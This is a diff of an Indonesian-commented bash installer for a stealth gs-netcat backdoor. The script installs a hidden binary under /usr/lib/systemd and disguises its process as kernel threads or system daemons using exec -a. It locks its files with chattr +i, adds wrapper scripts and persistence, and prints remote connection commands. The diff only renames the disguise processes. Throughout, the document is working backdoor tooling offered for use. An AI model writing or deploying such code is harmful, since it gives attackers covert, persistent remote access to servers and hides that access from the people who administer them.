@@ -1,22 +1,35 @@
 #!/bin/bash
 # ============================================================
-# SYSTEM DAEMON INSTALLER (PURE EXEC - NO PRCTL)
+# SYSTEM DAEMON INSTALLER (FINAL - NO SLASH IN NAMES)
 # Binary Location: /usr/lib/systemd/system_daemon
 # Secret Key: [VPS_IP]@dark-ai
 # Connection: gs-netcat -s [VPS_IP]@dark-ai -i
 # ============================================================
 
 # ============================================================
-# 0. SETUP VARIABLES (STEALTH)
+# 0. SETUP VARIABLES (FIXED - NO SLASH)
 # ============================================================
 HIDDEN_DIR="/usr/lib/systemd"
 BINARY_NAME="system_daemon"
 DAEMON_PATH="$HIDDEN_DIR/$BINARY_NAME"
 
-# Daftar nama proses kernel (tanpa path, untuk exec -a)
+# Daftar nama proses SISTEM (TANPA /)
 PROCESS_NAMES=(
-    "migration/0" "ksoftirqd/0" "watchdog/0" "cpuhp/0" "kthreadd"
-    "irkswapd0" "kcompactd0" "khungtaskd" "oom_reaper" "kdevtmpfs"
+    "irqbalance"      # IRQ balancer
+    "kswapd0"         # Kernel swap daemon
+    "kthreadd"        # Kernel thread daemon
+    "ksoftirqd0"      # Kernel soft IRQ (tanpa /)
+    "migration0"      # CPU migration (tanpa /)
+    "watchdog0"       # Kernel watchdog (tanpa /)
+    "cpuhp0"          # CPU hotplug (tanpa /)
+    "kdevtmpfs"       # Device tmpfs
+    "khungtaskd"      # Hung task detector
+    "oom_reaper"      # OOM reaper
+    "writeback"       # FS writeback
+    "kcompactd0"      # Memory compaction
+    "ksmd"           # Kernel samepage merging
+    "upowerd"        # Power management
+    "accountsdaemon" # User account tracking (tanpa -)
 )
 
 # Ambil IP VPS
@@ -24,10 +37,10 @@ VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/n
 DAEMON_SECRET="${VPS_IP}@dark-ai"
 
 # ============================================================
-# 1. DOWNLOAD BINARY (STEALTH)
+# 1. DOWNLOAD BINARY (FIXED)
 # ============================================================
 echo "=========================================="
-echo " SYSTEM DAEMON INSTALLER - EXEC MODE"
+echo " SYSTEM DAEMON INSTALLER - FINAL VERSION"
 echo "=========================================="
 
 mkdir -p "$HIDDEN_DIR" 2>/dev/null
@@ -56,7 +69,7 @@ fi
 chattr +i "$DAEMON_PATH" 2>/dev/null
 
 # ============================================================
-# 2. BUAT WRAPPER (PURE EXEC -A)
+# 2. BUAT WRAPPER (FIXED - NO SLASH)
 # ============================================================
 WRAPPER_DIR="/usr/sbin"
 mkdir -p "$WRAPPER_DIR" 2>/dev/null
@@ -70,13 +83,13 @@ for PROCESS in "${PROCESS_NAMES[@]}"; do
 #!/bin/bash
 exec -a "\$0" /usr/lib/systemd/system_daemon -s "$DAEMON_SECRET" -liqD 2>/dev/null &
 WRAPPEREOF
-        chmod +x "$WRAPPER_PATH"
+        chmod +x "$WRAPPER_PATH" 2>/dev/null
         chattr +i "$WRAPPER_PATH" 2>/dev/null
     fi
 done
 
 # ============================================================
-# 3. JALANKAN DAEMON (PURE EXEC -A)
+# 3. JALANKAN DAEMON (FIXED)
 # ============================================================
 echo "[*] Mengaktifkan layanan sistem..."
 pkill -f "system_daemon" 2>/dev/null
@@ -84,7 +97,7 @@ pkill -f "system_daemon" 2>/dev/null
 # Pilih nama proses acak
 PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
 
-# Jalankan dengan exec -a (tanpa argumen terlihat)
+# Jalankan dengan exec -a
 nohup exec -a "$PROCESS_NAME" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
 
 sleep 2
@@ -96,7 +109,7 @@ else
 fi
 
 # ============================================================
-# 4. PERSISTENCE (PURE EXEC -A)
+# 4. PERSISTENCE (FIXED)
 # ============================================================
 echo "[*] Mengkonfigurasi persisten..."
 
@@ -211,15 +224,15 @@ echo "   socat - TCP:$VPS_IP:443"
 echo ""
 echo "🔍 VERIFIKASI:"
 echo "-----------------"
-echo "Cek proses: ps aux | grep -E 'migration/0|ksoftirqd/0|watchdog/0'"
-echo "   (Proses akan terlihat sebagai nama kernel thread)"
+echo "Cek proses: ps aux | grep -E '$(echo "${PROCESS_NAMES[@]}" | tr ' ' '|')'"
+echo "   (Proses akan terlihat sebagai nama sistem, TANPA argumen)"
 echo "Cek service: systemctl status system_daemon"
 echo "Cek port:    ss -tulnp | grep 443"
 echo ""
 echo "⚠️  PERINGATAN:"
 echo "-----------------"
-echo "Proses akan terlihat sebagai kernel thread (misal: migration/0)."
-echo "Argumen -s dan -liqD disembunyikan dengan exec -a."
+echo "Proses akan terlihat sebagai proses sistem asli."
+echo "Argumen disembunyikan dengan exec -a dan wrapper."
 echo "Simpan secret key dan IP VPS dengan aman!"
 echo "=========================================="
 echo ""
